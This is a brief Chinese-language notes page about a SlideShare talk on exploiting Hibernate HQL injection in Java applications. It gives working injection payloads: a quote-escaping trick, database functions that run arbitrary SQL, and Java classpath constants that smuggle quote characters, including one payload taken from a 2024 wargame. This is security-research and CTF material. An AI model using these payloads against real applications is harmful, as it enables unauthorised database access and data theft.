---
title: "https://www.slideshare.net/0ang3el/new-methods-for-exploiting-orm-injections-in-java-applications"
description: "Hibernate

不支援 UNION 語法
單引號跳脫法

MySQL 中，單引號用 \' 跳脫
HQL 中，用兩個單引號 '' 跳脫
'abc\''or 1=(SELECT 1)--'

在 HQL 是一個字串
在 MySQL 是字串+額外 SQL 語句




Magic Function 法

PostgreSQL 中內建 query_to_xml('Arbitary SQL')
Oracle 中有 dbms_xmlgen.getxml('SQL')


Java Constants

可以從 classpath 中去找 constant 來用
例如 ch.qos.logback.core.CoreConstants.SINGLE_QUOTE_CHAR 在 MySQL 層就會被解成單引號 (在 HQL 層則不是)
Example: DEVCORE Wargame 2024 - Spring

/a'*length('a')*org.apache.logging.log4j.util.Chars.QUOTE and '-- '='a

HQL: 等同 /a'*length('a')*org.apache.logging.log4j.util.Chars.QUOTE and '[shit]'='a
MySQL: 等同 /a'*length('a')*'[shit]'-- [shit]




常見 Constants:

org.apache.batik.util.XMLConstants.XML_CHAR_APOS
com.ibm.icu.impl.PatternTokenizer.SINGLE_QUOTE
jodd.util.StringPool.SINGLE_QUOTE
ch.qos.logback.core.CoreConstants.SINGLE_QUOTE_CHAR
cz.vutbr.web.csskit.OutputUtil.STRING_OPENING
com.sun.java.help.impl.DocPConst.QUOTE
org.eclipse.help.internal.webapp.utils.JSonHelper.QUOTE
org.apache.logging.log4j.util.Chars.QUOTE




Reference


https://www.slideshare.net/slideshow/new-methods-for-exploiting-orm-injections-in-java-applications/62514298



"
external_category: "Black Hat Tools"
---[Visit Website](https://www.slideshare.net/0ang3el/new-methods-for-exploiting-orm-injections-in-java-applications)

